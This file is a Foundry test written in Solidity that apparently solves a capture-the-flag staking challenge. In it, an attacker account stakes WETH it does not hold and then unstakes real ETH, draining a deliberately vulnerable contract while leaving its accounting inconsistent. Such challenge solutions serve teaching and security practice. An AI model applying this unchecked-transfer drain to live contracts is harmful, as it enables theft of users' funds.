// SPDX-Licence-Idenifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Stake} from "../Stake.sol";
import {MockERC20} from "../MockERC20.sol";

contract StakeTest is Test {
    Stake stake;
    MockERC20 mock;
    address attacker = makeAddr("attacker");
    address staker = makeAddr("staker");

    function setUp() public {
        mock = new MockERC20("wrapped ether", "weth");
        stake = new Stake(address(mock));
        vm.prank(staker);
        vm.deal(staker, 100 ether);
        stake.StakeETH{value: 100 ether}();
    }
    function test_Challenge31_Passed() public {
        uint256 balanceBefore = address(stake).balance - 1 ether;
        vm.startPrank(attacker);
        mock.approve(address(stake), type(uint256).max);
        stake.StakeWETH(balanceBefore);
        stake.Unstake(balanceBefore);
        vm.stopPrank();

        uint256 balanceAfter = address(stake).balance;
        assert(balanceAfter > 0 );
        assert(stake.totalStaked() > balanceAfter);
        assert(stake.Stakers(attacker));
        assertEq(stake.UserStake(attacker), 0);        
    }
}

